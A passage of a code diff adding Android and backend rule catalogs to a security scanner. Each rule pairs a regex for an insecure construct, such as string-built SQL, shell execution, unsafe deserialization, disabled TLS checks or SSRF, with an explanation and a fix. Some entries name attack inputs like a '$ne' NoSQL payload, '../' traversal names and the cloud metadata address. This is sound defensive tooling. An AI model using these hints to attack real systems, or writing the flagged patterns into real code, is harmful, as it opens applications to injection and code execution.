+  rule("AND-BLD-10", "high", "android", F.kotlinJava, /\b(DexClassLoader|PathClassLoader|InMemoryDexClassLoader)\s*\(/, "Code loaded at runtime", "Loading code from files or the network lets whoever controls them run code as your app.", "Ship all code in the APK (or use Play Feature Delivery).", ["CWE-494"]),
+  rule("AND-BLD-11", "medium", "android", /\/(jni|cpp)\/.+\.(c|cc|cpp)$/, /\b(strcpy|strcat|sprintf|gets|vsprintf)\s*\(/, "Unsafe C string function in native code", "These overflow the buffer on long input.", "Use strncpy/strlcpy, snprintf, and bounds checks.", ["CWE-120"]),
+  // ── Injection
+  rule("AND-INJ-01", "high", "android", F.kotlinJava, /(rawQuery|execSQL)\s*\(\s*("[^"]*"\s*\+|"[^"]*\$\{?\w|String\.format)/, "SQL built from strings", "Values in the SQL string can change the query (SQL injection).", "Use selectionArgs / bind parameters, or Room @Query with :params.", ["CWE-89"]),
+  rule("AND-INJ-01", "high", "android", F.kotlinJava, /SimpleSQLiteQuery\s*\(\s*("[^"]*"\s*\+|"[^"]*\$\{?\w)/, "Room raw query built from strings", "Values interpolated into a raw query can change it.", "Pass bind args to SimpleSQLiteQuery(sql, args).", ["CWE-89"]),
+  rule("AND-INJ-02", "high", "android", F.kotlinJava, /Runtime\.getRuntime\(\)\.exec\s*\(\s*[^)"]*\+|ProcessBuilder\s*\([^)]*\+/, "Command built from strings", "Input in the command line can run other commands.", "Avoid shell commands; pass arguments as an array without a shell.", ["CWE-78"]),
+  rule("AND-INJ-03", "high", "android", F.kotlinJava, /(ZipInputStream|ZipFile)[\s\S]{0,600}File\s*\([^)]*\.name\s*\)/, "Zip entries extracted without path check (zip slip)", "An entry named ../../x overwrites files outside the target folder.", "Check that the canonical path of each entry stays under the destination.", ["CWE-22"], { unless: /canonicalPath|normalize\(\)|startsWith\(/ }),
+  rule("AND-INJ-04", "medium", "android", F.kotlinJava, /DocumentBuilderFactory\.newInstance\s*\(\s*\)/, "XML parser with external entities", "Untrusted XML can read local files or call internal URLs (XXE).", "Set FEATURE disallow-doctype-decl to true.", ["CWE-611"], { unless: /disallow-doctype-decl|FEATURE_SECURE_PROCESSING/ }),
+  rule("AND-INJ-05", "high", "android", F.kotlinJava, /ObjectInputStream\s*\(/, "Java deserialization", "Deserializing untrusted bytes can run gadget-chain code.", "Use JSON / protobuf with explicit types.", ["CWE-502"]),
+  rule("AND-INJ-06", "medium", "android", F.kotlinJava, /extends\s+PreferenceActivity|:\s*PreferenceActivity\s*\(/, "PreferenceActivity fragment injection", "An exported PreferenceActivity can be told to load any fragment class.", "Override isValidFragment to allow only your fragments, or use PreferenceFragmentCompat.", ["CWE-470"], { unless: /isValidFragment/ })
+];
+
+// src/security/catalog/backend.ts
+var SQL = "Use parameterised queries (placeholders + bound values) or the ORM's query builder; never build SQL from strings.";
+var CMD = "Avoid the shell: call the program with an argument array, and allowlist any user-chosen value.";
+var DESER = "Never deserialize untrusted data with a format that can create arbitrary objects; use JSON with a schema.";
+var TLS = "Leave certificate verification on; trust a private CA by adding it, not by turning checks off.";
+var BACKEND = [
+  // ── Node.js / TypeScript
+  rule("API-INJ-01", "critical", "node", F.js, /\.(query|execute|raw|\$queryRawUnsafe|\$executeRawUnsafe|whereRaw|orderByRaw|havingRaw)\s*\(\s*`[^`]*\$\{/, "SQL built with a template string", "Interpolated request values change the query (SQL injection).", SQL, ["CWE-89", "OWASP A03"]),
+  rule("API-INJ-01", "critical", "node", F.js, /\.(query|execute|raw|whereRaw)\s*\(\s*["'][^"']*(SELECT|INSERT|UPDATE|DELETE|WHERE)[^"']*["']\s*\+/i, "SQL built by concatenation", "Concatenated values change the query (SQL injection).", SQL, ["CWE-89"]),
+  rule("API-INJ-02", "high", "node", F.js, /\.(find|findOne|updateOne|updateMany|deleteOne|deleteMany|countDocuments)\s*\(\s*req\.(body|query|params)\b/, "MongoDB query from the raw request", '{"$ne": null} in the body matches every document (NoSQL injection), e.g. logging in without a password.', "Pick and type-check each field (String(req.body.email)) or validate with a schema; use mongo-sanitize.", ["CWE-943"]),
+  rule("API-INJ-02", "high", "node", F.js, /\$where\s*:/, "MongoDB $where", "$where runs JavaScript on the database; with input it is code injection.", "Use normal query operators.", ["CWE-943"]),
+  rule("API-INJ-03", "critical", "node", F.js, /\b(exec|execSync)\s*\(\s*(`[^`]*\$\{|["'][^"']*["']\s*\+)|spawn(Sync)?\s*\([^)]*shell\s*:\s*true/, "Shell command built from strings", "Input with ; or $( ) runs other commands on the server.", CMD, ["CWE-78"]),
+  rule("API-INJ-07", "critical", "node", F.js, /\bvm\.(runInNewContext|runInThisContext|runInContext)\s*\(|\bnew\s+vm\.Script\s*\(/, "Code run with node:vm", "vm is not a sandbox; input reaching it is remote code execution.", "Do not run user code in-process; use an isolated worker or remove it.", ["CWE-95"]),
+  rule("API-INJ-04", "critical", "node", F.js, /(ejs|handlebars|Handlebars|pug|nunjucks)\.(compile|render)\s*\(\s*(req\.|body\.|input|template\s*\+)/, "Template compiled from user input", "Template syntax in input runs on the server (SSTI).", "Compile only templates you ship; pass user values as data.", ["CWE-1336"]),
+  rule("API-AUN-03", "critical", "node", F.js, /jwt\.decode\s*\(/, "JWT decoded without verification", "decode() does not check the signature; anyone can forge the token.", "Use jwt.verify(token, key, { algorithms: ['RS256'] }) (or your algorithm).", ["CWE-347"], { when: /(req\.|headers|authorization|bearer)/i, unless: /jwt\.verify\s*\(/ }),
+  rule("API-AUN-03", "high", "node", F.js, /jwt\.verify\s*\(\s*[^,]+,\s*[^,)]+\s*\)/, "JWT verified without pinning the algorithm", "Without `algorithms`, some libraries accept a token signed with a different algorithm than intended.", "Pass { algorithms: ['RS256'] } (the one you issue), plus audience and issuer.", ["CWE-347"]),
+  rule("API-AUN-03", "critical", "node", F.js, /algorithms\s*:\s*\[[^\]]*["']none["']/i, "JWT algorithm none accepted", "Unsigned tokens are accepted: anyone can be anyone.", "Remove 'none'.", ["CWE-347"]),
+  rule("API-AUN-04", "critical", "node", F.js, /(jwt\.sign|jwt\.verify|session\s*\(\s*\{|cookieSession\s*\(|secret\s*:)\s*[^\n]*["'](secret|changeme|keyboard cat|mysecret|your[-_]?secret|supersecret|dev|test)["']/i, "Weak or hard-coded signing secret", "Anyone who reads the code (or guesses) can sign sessions and tokens.", "Load a long random secret from the environment / secret store.", ["CWE-798"], { secret: true }),
+  rule("API-DAT-03", "high", "node", F.js, /process\.env\.\w*(SECRET|KEY|PASSWORD|TOKEN)\w*\s*(\|\||\?\?)\s*["'][^"']+["']/, "Secret with a hard-coded fallback", "If the env var is missing in production, the app silently uses the public default.", "Fail at startup when the variable is missing.", ["CWE-1188"]),
+  rule("API-HTTP-01", "high", "node", F.js, /cors\s*\(\s*\{[^}]*origin\s*:\s*(true|["']\*["'])[^}]*credentials\s*:\s*true|cors\s*\(\s*\{[^}]*credentials\s*:\s*true[^}]*origin\s*:\s*(true|["']\*["'])/, "CORS reflects any origin with credentials", "Any website can make authenticated requests as the visitor and read the responses.", "List the exact origins allowed.", ["CWE-942"]),
+  rule("API-HTTP-01", "high", "node", F.js, /Access-Control-Allow-Origin["']\s*,\s*req\.headers\.origin/, "CORS origin echoed back", "Every origin is allowed; with credentials any site can read user data.", "Check the origin against an allowlist first.", ["CWE-942"]),
+  rule("API-HTTP-03", "high", "node", F.js, /rejectUnauthorized\s*:\s*false|NODE_TLS_REJECT_UNAUTHORIZED\s*=?\s*["']?0/, "TLS verification turned off", "Outbound calls accept any certificate; a network attacker reads and changes them.", TLS, ["CWE-295"]),
+  rule("API-SRV-07", "medium", "node", F.js, /res\.redirect\s*\(\s*(\d+\s*,\s*)?req\.(query|body|params)\.\w+\s*\)/, "Open redirect", "Your domain sends users to any site (phishing that looks like you).", "Allow only relative paths or allowlisted hosts.", ["CWE-601"]),
+  rule("API-SRV-02", "high", "node", F.js, /(readFile|readFileSync|createReadStream|sendFile|download)\s*\(\s*(path\.join\s*\([^)]*)?req\.(query|params|body)/, "File path from the request", "../ in the value reads any file the server can (path traversal).", "Resolve the path and check it stays inside the allowed folder; better, map ids to files.", ["CWE-22"]),
+  rule("API-SRV-01", "high", "node", F.js, /(fetch|axios(\.get|\.post)?|got|request|http\.get|https\.get)\s*\(\s*req\.(query|body|params)\.\w*(url|uri|link|href|target|callback|webhook)/i, "Server fetches a URL from the request (SSRF)", "Attackers make your server call internal services or cloud metadata (169.254.169.254).", "Allowlist hosts, resolve and block private IP ranges, and disable redirects.", ["CWE-918", "API7"]),
+  rule("API-AUZ-03", "high", "node", F.js, /\.(create|update|updateOne|findByIdAndUpdate|findOneAndUpdate|upsert|insert)\s*\(\s*(\{[^}]*data\s*:\s*)?req\.body\s*[,)}]|Object\.assign\s*\(\s*\w+\s*,\s*req\.body\s*\)/, "Request body written straight to the model (mass assignment)", "A client can set fields it should not: role, isAdmin, ownerId, balance.", "Pick allowed fields explicitly or validate with a schema that strips unknown keys.", ["CWE-915", "API3"]),
+  rule("API-RES-03", "medium", "node", F.js, /express\.json\s*\(\s*\)|bodyParser\.json\s*\(\s*\)/, "Request body size not limited", "Huge JSON bodies tie up memory and CPU.", "Set a limit: express.json({ limit: '100kb' }).", ["CWE-400"]),
+  rule("API-HTTP-04", "low", "node", F.js, /=\s*express\s*\(\s*\)/, "Express app without helmet", "Default responses lack security headers (CSP, HSTS, nosniff, frame-ancestors).", "app.use(helmet()).", ["CWE-693"], { unless: /helmet/ }),
+  rule("API-HTTP-05", "medium", "node", F.js, /cookie\s*:\s*\{[^}]*(secure\s*:\s*false|httpOnly\s*:\s*false)/, "Session cookie without Secure or HttpOnly", "The cookie is sent over HTTP or readable by scripts (XSS steals it).", "Set secure: true, httpOnly: true, sameSite: 'lax'.", ["CWE-614", "CWE-1004"]),
+  rule("API-LOG-02", "medium", "node", F.js, /(console\.(log|info|debug)|logger\.(info|debug))\s*\([^)\n]*(req\.body|req\.headers|authorization|password)/i, "Request secrets logged", "Passwords and tokens end up in log storage readable by many people.", "Log ids and outcomes, never bodies or auth headers.", ["CWE-532"]),
+  rule("API-BIZ-05", "high", "node", F.js, /(\/webhook|webhooks?)["'`][\s\S]{0,300}req\.body/i, "Webhook without signature check", "Anyone can call the webhook and fake payments or events.", "Verify the provider's signature (e.g. stripe.webhooks.constructEvent with the raw body).", ["CWE-345"], { unless: /constructEvent|verifySignature|x-hub-signature|stripe-signature|timingSafeEqual|svix|verifyWebhook/i }),
+  rule("API-AUN-11", "low", "node", F.js, /(token|signature|hmac|digest|apiKey|secret)\w*\s*===?\s*(req\.|header|provided|expected)/i, "Secret compared with ===", "String comparison leaks timing; attackers can guess the value byte by byte.", "Use crypto.timingSafeEqual on equal-length buffers.", ["CWE-208"], { unless: /timingSafeEqual/ }),
+  rule("API-DAT-02", "high", "node", F.js, /Math\.random\s*\(\s*\)[\s\S]{0,80}(token|secret|password|otp|code|nonce|salt|id\b)/i, "Math.random for a security value", "Math.random is predictable; tokens and codes made with it can be guessed.", "Use crypto.randomBytes / crypto.randomUUID.", ["CWE-338"]),
+  rule("API-DAT-02", "high", "node", F.js, /createHash\s*\(\s*["'](md5|sha1)["']\s*\)[\s\S]{0,80}password/i, "Password hashed with MD5/SHA-1", "Fast hashes are cracked at billions per second.", "Use bcrypt, scrypt or argon2.", ["CWE-916"]),
+  rule("API-DAT-02", "high", "node", F.js, /createCipher\s*\(|createCipheriv\s*\(\s*["']aes-\d+-ecb["']/, "Deprecated or ECB cipher", "createCipher derives a weak key and IV; ECB leaks patterns.", "Use createCipheriv('aes-256-gcm', key, randomIv).", ["CWE-327"]),
+  rule("API-LOG-01", "medium", "node", F.js, /res\.(send|json|status\(\d+\)\.(send|json))\s*\(\s*(err|error)(\.stack)?\s*\)/, "Error object sent to the client", "Stack traces and messages reveal internals (paths, queries, library versions).", "Send a generic message and an id; log the details server-side.", ["CWE-209"]),
+  rule("API-AUN-05", "high", "node", F.js, /\.(post|put)\s*\(\s*["'`]\/?(api\/)?(auth\/)?(login|signin|sign-in|otp|verify|reset-password|forgot-password|2fa)["'`]/i, "Login or OTP endpoint without rate limiting", "Passwords and one-time codes can be brute-forced.", "Add rate limiting per account and IP (express-rate-limit, @nestjs/throttler) and lockout/backoff.", ["CWE-307", "API4"], { unless: /rateLimit|RateLimit|throttle|Throttle|limiter|slowDown/ }),
+  rule("API-RES-04", "medium", "node", F.js, /new\s+ApolloServer\s*\(\s*\{/, "GraphQL without depth or cost limits", "Nested queries can take the server down.", "Add depth/complexity limits (graphql-depth-limit, cost analysis) and disable introspection in production.", ["API4"], { unless: /depthLimit|costAnalysis|complexity|validationRules/ }),
+  rule("API-AUN-01", "high", "node", F.js, /["']use server["'][\s\S]*export\s+async\s+function\s+\w+\s*\(/, "Server action without a session check", "Server actions are public HTTP endpoints; anyone can call them with any arguments.", "Check the session (auth()/getServerSession) and ownership at the top of every action.", ["CWE-306", "API2"], { unless: /auth\(\)|getServerSession|currentUser|getUser\(|requireUser|session/ }),
+  // ── Python
+  rule("API-INJ-01", "critical", "python", F.py, /\.(execute|executemany|raw|extra)\s*\(\s*(f["']|["'][^"']*["']\s*(%|\+|\.format))/, "SQL built from strings", "Interpolated values change the query (SQL injection).", SQL, ["CWE-89"]),
+  rule("API-INJ-01", "critical", "python", F.py, /\btext\s*\(\s*f["']/, "SQLAlchemy text() with an f-string", "Values in the f-string change the query.", "Use bound parameters: text('\u2026 :id'), {'id': value}.", ["CWE-89"]),
+  rule("API-INJ-03", "critical", "python", F.py, /subprocess\.\w+\s*\([^)]*shell\s*=\s*True|os\.(system|popen)\s*\(/, "Shell command", "Input in the command runs other commands.", CMD, ["CWE-78"]),
+  rule("API-INJ-07", "critical", "python", F.py, /\b(eval|exec)\s*\(\s*(request\.|input|data|payload|body|params)/, "eval/exec of request data", "Remote code execution.", "Remove it; parse data with json / ast.literal_eval.", ["CWE-95"]),
+  rule("API-SRV-04", "critical", "python", F.py, /pickle\.loads?\s*\(|cPickle\.loads?\s*\(|marshal\.loads?\s*\(|shelve\.open\s*\(/, "pickle/marshal deserialization", "Unpickling untrusted data runs arbitrary code.", DESER, ["CWE-502"]),
+  rule("API-SRV-04", "critical", "python", F.py, /yaml\.load\s*\((?![^)]*Loader\s*=\s*(yaml\.)?(Safe|CSafe)Loader)/, "yaml.load without SafeLoader", "Full YAML loading builds arbitrary Python objects (code execution).", "Use yaml.safe_load.", ["CWE-502"]),
+  rule("API-INJ-04", "critical", "python", F.py, /render_template_string\s*\(|Template\s*\(\s*(request\.|data|body|user)|Environment\([^)]*\)\.from_string\s*\(/, "Template rendered from a string", "If the string contains user input, Jinja syntax runs on the server (SSTI).", "Render template files and pass user data as variables.", ["CWE-1336"]),
+  rule("API-LOG-01", "medium", "python", /settings[^/]*\.py$|config[^/]*\.py$/, /^\s*DEBUG\s*=\s*True/m, "Django/Flask DEBUG on", "Debug pages show source, settings and secrets to anyone who triggers an error.", "Read DEBUG from the environment, default False.", ["CWE-209"]),
+  rule("API-LOG-01", "high", "python", F.py, /app\.run\s*\([^)]*debug\s*=\s*True/, "Flask debug server", "The Werkzeug debugger gives a Python console to anyone who can reach it.", "Never enable debug outside local development; run with gunicorn/uwsgi.", ["CWE-489"]),
+  rule("API-AUN-04", "critical", "python", /settings[^/]*\.py$|config[^/]*\.py$/, /^\s*SECRET_KEY\s*=\s*["'][^"']{8,}["']/m, "Django/Flask SECRET_KEY in code", "With the secret key, sessions and signed data can be forged.", "Load it from the environment.", ["CWE-798"], { secret: true }),
+  rule("API-HTTP-01", "medium", "python", /settings[^/]*\.py$/, /ALLOWED_HOSTS\s*=\s*\[\s*["']\*["']\s*\]/, "ALLOWED_HOSTS allows any host", "Host-header attacks poison password-reset links and caches.", "List your domains.", ["CWE-644"]),
+  rule("API-HTTP-02", "high", "python", F.py, /@csrf_exempt/, "CSRF protection turned off for a view", "Other sites can make the logged-in user's browser call it.", "Remove @csrf_exempt, or use token auth for that endpoint instead of cookies.", ["CWE-352"]),
+  rule("API-HTTP-05", "medium", "python", /settings[^/]*\.py$/, /(SESSION_COOKIE_SECURE|CSRF_COOKIE_SECURE)\s*=\s*False|SESSION_COOKIE_HTTPONLY\s*=\s*False/, "Insecure session cookie settings", "Cookies go over HTTP or are readable by scripts.", "Set SESSION_COOKIE_SECURE / CSRF_COOKIE_SECURE = True.", ["CWE-614"]),
+  rule("API-HTTP-03", "high", "python", F.py, /verify\s*=\s*False|ssl\._create_unverified_context|CERT_NONE/, "TLS verification turned off", "Outbound calls accept any certificate.", TLS, ["CWE-295"]),
+  rule("API-AUZ-03", "high", "python", F.py, /fields\s*=\s*["']__all__["']/, "Serializer or form exposes every field", "Clients can read and write fields like is_staff or password.", "List the fields explicitly and mark sensitive ones read_only.", ["CWE-915", "API3"]),
+  rule("API-SRV-05", "high", "python", F.py, /from\s+(lxml|xml\.etree|xml\.dom|xml\.sax)\b|import\s+(lxml|xml\.etree)/, "XML parsed with the standard library", "Untrusted XML can cause XXE or billion-laughs denial of service.", "Use defusedxml.", ["CWE-611"], { unless: /defusedxml/ }),
+  rule("API-SRV-07", "medium", "python", F.py, /redirect\s*\(\s*request\.(args|GET|POST|form|query_params)\.get\s*\(/, "Open redirect", "Your domain sends users to any site.", "Use url_has_allowed_host_and_scheme / allow relative paths only.", ["CWE-601"]),
+  rule("API-SRV-02", "high", "python", F.py, /(open|send_file|FileResponse)\s*\(\s*(os\.path\.join\s*\([^)]*)?request\./, "File path from the request", "../ reads any file the server can.", "Use safe_join / check the resolved path stays in the folder.", ["CWE-22"]),
+  rule("API-DAT-02", "high", "python", F.py, /\brandom\.(random|randint|choice|choices|getrandbits)\s*\([\s\S]{0,80}(token|secret|password|otp|code|nonce)/i, "random module for a security value", "random is predictable.", "Use secrets.token_urlsafe / secrets.choice.", ["CWE-338"]),
+  rule("API-DAT-02", "high", "python", F.py, /hashlib\.(md5|sha1)\s*\([^)]*password/i, "Password hashed with MD5/SHA-1", "Fast hashes are cracked quickly.", "Use argon2-cffi, bcrypt or Django's password hashers.", ["CWE-916"]),
+  // ── JVM (Spring, Ktor)
+  rule("API-INJ-01", "critical", "jvm", F.kotlinJava, /(createQuery|createNativeQuery|jdbcTemplate\.(query|update|execute|queryForObject|queryForList)|executeQuery|prepareStatement)\s*\(\s*"[^"]*"\s*\+|(createQuery|createNativeQuery|executeQuery)\s*\(\s*"[^"]*\$\{?\w/, "SQL/JPQL built from strings", "Concatenated values change the query.", SQL, ["CWE-89"], { unless: /extends\s+ContentProvider/ }),
+  rule("API-AUZ-02", "critical", "jvm", F.kotlinJava, /requestMatchers\s*\([^)]*\/(admin|internal|management|actuator)[^)]*\)\s*\.permitAll\s*\(\s*\)|antMatchers\s*\([^)]*\/(admin|internal|actuator)[^)]*\)\s*\.permitAll/, "Admin routes open to everyone", "permitAll on admin or actuator paths needs no login.", 'Require a role: .hasRole("ADMIN").', ["CWE-285", "API5"]),
+  rule("API-HTTP-02", "high", "jvm", F.kotlinJava, /csrf\s*\(\s*\)\s*\.disable\s*\(\s*\)|csrf\s*\{\s*it\.disable\(\)|csrf\s*\{\s*disable\s*\(\s*\)/, "CSRF protection disabled", "With cookie sessions, other sites can make the user's browser call your endpoints.", "Keep CSRF on for cookie-based sessions; disable it only for stateless token APIs.", ["CWE-352"], { unless: /SessionCreationPolicy\.STATELESS|oauth2ResourceServer|jwt\(/ }),
+  rule("API-LOG-04", "high", "jvm", /application[^/]*\.(properties|ya?ml)$/, /management\.endpoints\.web\.exposure\.include\s*[=:]\s*["']?\*|include:\s*["']?\*["']?/, "All actuator endpoints exposed", "/actuator/env and /heapdump reveal secrets and memory.", "Expose only health and info, behind auth.", ["CWE-489"]),
+  rule("API-SRV-04", "critical", "jvm", F.kotlinJava, /enableDefaultTyping\s*\(|activateDefaultTyping\s*\(|@JsonTypeInfo\s*\(\s*use\s*=\s*JsonTypeInfo\.Id\.CLASS|new\s+XStream\s*\(|XStream\s*\(\s*\)/, "Polymorphic deserialization of class names", "Attackers choose the class to instantiate (gadget chains, RCE).", DESER, ["CWE-502"]),
+  rule("API-SRV-04", "critical", "jvm", F.kotlinJava, /ObjectInputStream\s*\(/, "Java deserialization", "Deserializing request data runs gadget-chain code.", DESER, ["CWE-502"], { unless: /extends\s+(Activity|Fragment)|AndroidManifest/ }),
+  rule("API-HTTP-01", "high", "jvm", F.kotlinJava, /@CrossOrigin\s*\(\s*(origins\s*=\s*)?["']\*["']|allowedOrigins\s*\(\s*["']\*["']\s*\)[\s\S]{0,100}allowCredentials\s*\(\s*true|allowCredentials\s*=\s*true[\s\S]{0,100}allowedOrigin(Pattern)?s?\s*=?\s*\(?\s*["']\*/, "CORS allows any origin", "Any website can call the API (with credentials: read user data).", "List exact origins.", ["CWE-942"]),
+  rule("API-INJ-04", "critical", "jvm", F.kotlinJava, /SpelExpressionParser\s*\(\s*\)\.parseExpression\s*\(\s*(?!")/, "SpEL expression from data", "Expression language from input runs code on the server.", "Never parse user input as SpEL.", ["CWE-917"]),
+  rule("API-AUZ-03", "high", "jvm", F.kotlinJava, /@RequestBody\s+(\w+Entity|User|Account)\b/, "Request body bound to a persistence entity", "Clients can set any column, including role or owner.", "Bind to a DTO with only the editable fields.", ["CWE-915"]),
+  rule("API-HTTP-03", "high", "jvm", F.kotlinJava, /TrustAllStrategy|TrustSelfSignedStrategy|NoopHostnameVerifier|InsecureTrustManagerFactory/, "TLS verification turned off", "Outbound calls accept any certificate.", TLS, ["CWE-295"]),
+  // ── Go
+  rule("API-INJ-01", "critical", "go", F.go, /\.(Query|QueryRow|Exec|QueryContext|ExecContext)\s*\(\s*(ctx\s*,\s*)?(fmt\.Sprintf\s*\(|"[^"]*"\s*\+)/, "SQL built from strings", "Interpolated values change the query.", SQL, ["CWE-89"]),
+  rule("API-INJ-03", "critical", "go", F.go, /exec\.Command(Context)?\s*\(\s*(ctx\s*,\s*)?"(sh|bash|cmd|powershell)"\s*,\s*"(-c|\/c)"/, "Shell command", "Input in the command runs other commands.", CMD, ["CWE-78"]),
+  rule("API-HTTP-03", "high", "go", F.go, /InsecureSkipVerify\s*:\s*true/, "TLS verification turned off", "Outbound calls accept any certificate.", TLS, ["CWE-295"]),
+  rule("API-INJ-04", "high", "go", F.go, /"text\/template"/, "text/template used (no HTML escaping)", "If it renders HTML, user values become script (XSS).", "Use html/template for HTML.", ["CWE-79"], { when: /<html|text\/html|\.html"/ }),
+  rule("API-INJ-04", "high", "go", F.go, /template\.(HTML|JS|URL)\s*\(\s*(r\.|req\.|input|user|data)/, "Untrusted value marked safe for templates", "html/template stops escaping it.", "Do not wrap user input in template.HTML/JS/URL.", ["CWE-79"]),
+  rule("API-SRV-02", "high", "go", F.go, /filepath\.Join\s*\([^)]*(r\.URL\.Query\(\)|r\.FormValue|c\.Param|c\.Query|mux\.Vars)/, "File path from the request", "../ reads any file the server can.", "Clean the path and check it stays under the base folder (filepath.Rel / strings.HasPrefix).", ["CWE-22"]),
+  rule("API-LOG-04", "high", "go", F.go, /_\s+"net\/http\/pprof"/, "pprof handlers registered", "Profiling endpoints leak memory and can be abused for DoS.", "Serve pprof only on a private admin port, or behind a build tag.", ["CWE-489"]),
+  rule("API-RES-03", "medium", "go", F.go, /http\.ListenAndServe(TLS)?\s*\(/, "HTTP server without timeouts", "Slow clients hold connections open forever (Slowloris).", "Use http.Server{ReadHeaderTimeout, ReadTimeout, WriteTimeout, IdleTimeout}.", ["CWE-400"]),
+  rule("API-DAT-02", "high", "go", F.go, /"math\/rand"/, "math/rand imported", "If used for tokens, codes or keys, values are predictable.", "Use crypto/rand for anything secret.", ["CWE-338"], { when: /(token|secret|password|otp|nonce|session)/i }),
+  // ── .NET
+  rule("API-INJ-01", "critical", "dotnet", F.cs, /FromSqlRaw\s*\(\s*\$"|ExecuteSqlRaw\s*\(\s*\$"|new\s+SqlCommand\s*\(\s*(\$"|"[^"]*"\s*\+)/, "SQL built from strings", "Interpolated values change the query.", "Use FromSqlInterpolated / parameters.", ["CWE-89"]),
+  rule("API-SRV-04", "critical", "dotnet", F.cs, /BinaryFormatter|NetDataContractSerializer|LosFormatter|TypeNameHandling\s*=\s*TypeNameHandling\.(All|Auto|Objects)/, "Unsafe .NET deserialization", "Attackers choose types to instantiate (RCE).", DESER, ["CWE-502"]),
+  rule("API-HTTP-02", "high", "dotnet", F.cs, /\[IgnoreAntiforgeryToken\]/, "Antiforgery check turned off", "Cookie-authenticated actions can be called from other sites.", "Remove it or use token auth for that endpoint.", ["CWE-352"]),
+  rule("API-HTTP-03", "high", "dotnet", F.cs, /ServerCertificateCustomValidationCallback\s*=\s*\([^)]*\)\s*=>\s*true|DangerousAcceptAnyServerCertificateValidator|ServerCertificateValidationCallback\s*\+?=\s*[^;]*=>\s*true/, "TLS verification turned off", "Outbound calls accept any certificate.", TLS, ["CWE-295"]),
+  rule("API-LOG-01", "medium", "dotnet", F.cs, /app\.UseDeveloperExceptionPage\s*\(\s*\)/, "Developer exception page", "Stack traces and source go to anyone who triggers an error.", "Only in Development: if (env.IsDevelopment()).", ["CWE-209"], { unless: /IsDevelopment\(\)/ }),
+  rule("API-HTTP-01", "high", "dotnet", F.cs, /AllowAnyOrigin\s*\(\s*\)[\s\S]{0,120}AllowCredentials|SetIsOriginAllowed\s*\(\s*_\s*=>\s*true\s*\)/, "CORS allows any origin", "Any website can call the API as the user.", 'WithOrigins("https://app.example.com").', ["CWE-942"]),
+  rule("API-AUN-01", "high", "dotnet", F.cs, /\[AllowAnonymous\][\s\S]{0,200}(Delete|Update|Admin|Transfer|Pay|Remove|Create)\w*\s*\(/, "Anonymous access on a state-changing action", "Anyone can call it without logging in.", "Remove [AllowAnonymous] unless it is truly public.", ["CWE-306"]),
+  // ── PHP
+  rule("API-INJ-01", "critical", "php", F.php, /(mysqli_query|mysql_query|->query|DB::(raw|select|statement)|whereRaw|->exec)\s*\([^)]*\$_(GET|POST|REQUEST|COOKIE)|["'][^"']*(SELECT|INSERT|UPDATE|DELETE)[^"']*["']\s*\.\s*\$_(GET|POST|REQUEST)/i, "SQL built from request data", "SQL injection.", SQL, ["CWE-89"]),
+  rule("API-SRV-04", "critical", "php", F.php, /unserialize\s*\(\s*\$_(GET|POST|REQUEST|COOKIE)|unserialize\s*\(\s*(base64_decode\s*\()?\$(input|data|payload|request)/, "unserialize of request data", "PHP object injection (gadget chains, RCE).", "Use json_decode.", ["CWE-502"]),
+  rule("API-SRV-02", "critical", "php", F.php, /(include|require)(_once)?\s*\(?\s*[^;]*\$_(GET|POST|REQUEST|COOKIE)/, "File include from request data", "Local/remote file inclusion runs any file as PHP.", "Map allowed names to files; never include user input.", ["CWE-98"]),
+  rule("API-INJ-03", "critical", "php", F.php, /\b(system|exec|shell_exec|passthru|popen|proc_open)\s*\([^)]*\$_(GET|POST|REQUEST)|`[^`]*\$_(GET|POST|REQUEST)/, "Shell command from request data", "Remote command execution.", "Use escapeshellarg and an allowlist, or avoid the shell.", ["CWE-78"]),
+  rule("API-AUZ-03", "high", "php", F.php, /protected\s+\$guarded\s*=\s*\[\s*\]/, "Eloquent model guards nothing", "Mass assignment can set any column.", "Use $fillable with the editable fields.", ["CWE-915"]),
+  rule("API-LOG-01", "medium", "php", /(^|\/)\.env(\.production)?$/, /^APP_DEBUG\s*=\s*true/m, "Laravel debug on", "Errors show stack traces, env values and SQL.", "APP_DEBUG=false in production.", ["CWE-209"], { tests: true }),
+  rule("API-LOG-04", "high", "php", F.php, /\bphpinfo\s*\(\s*\)/, "phpinfo() exposed", "Shows configuration, paths and environment (often secrets).", "Remove it.", ["CWE-200"]),
+  rule("API-AUN-11", "medium", "php", F.php, /(md5|sha1|hash)\s*\([^)]*\)\s*==\s*\$|\$\w*(hash|token|password)\w*\s*==\s*\$/i, "Loose comparison of hashes or tokens", 'PHP type juggling makes "0e123" == "0e456" true.', "Use hash_equals / password_verify.", ["CWE-697"]),
+  // ── Ruby on Rails
+  rule("API-INJ-01", "critical", "ruby", F.rb, /\.(where|find_by_sql|order|group|having|joins|pluck|select)\s*\(\s*"[^"]*#\{/, "SQL built with interpolation", "Interpolated params change the query.", 'Use placeholders: where("name = ?", name) or hash conditions.', ["CWE-89"]),
+  rule("API-AUZ-03", "high", "ruby", F.rb, /params\.permit!|params\[:\w+\]\.permit!/, "Strong parameters bypassed", "Clients can set any attribute.", "permit only the editable fields.", ["CWE-915"]),
+  rule("API-SRV-04", "critical", "ruby", F.rb, /Marshal\.load\s*\(|YAML\.load\s*\((?![^)]*permitted_classes)|Oj\.load\s*\([^)]*mode:\s*:object/, "Unsafe deserialization", "Loading untrusted data creates arbitrary objects (RCE).", "Use YAML.safe_load / JSON.parse.", ["CWE-502"]),
+  rule("API-HTTP-02", "high", "ruby", F.rb, /skip_before_action\s+:verify_authenticity_token|protect_from_forgery\s+with:\s*:null_session/, "CSRF protection skipped", "Cookie-authenticated actions can be called from other sites.", "Keep it on for browser sessions.", ["CWE-352"]),
+  rule("WEB-XSS-01", "high", "ruby", /\.(rb|erb|haml|slim)$/, /\.html_safe\b|\braw\s*\(?\s*(params|@\w+)/, "Output marked html_safe", "User data marked safe renders as HTML (XSS).", "Escape it (default) or sanitize().", ["CWE-79"]),
+  rule("API-SRV-07", "medium", "ruby", F.rb, /redirect_to\s+params\[/, "Open redirect", "Your domain sends users to any site.", "Allow only paths, or pass allow_other_host: false (Rails 7).", ["CWE-601"]),
+  rule("API-INJ-03", "critical", "ruby", F.rb, /(system|exec|spawn|%x|IO\.popen|Open3\.\w+)\s*\(?\s*["`][^"`]*#\{/, "Shell command with interpolation", "Input in the command runs other commands.", CMD, ["CWE-78"]),
+  // ── Any backend
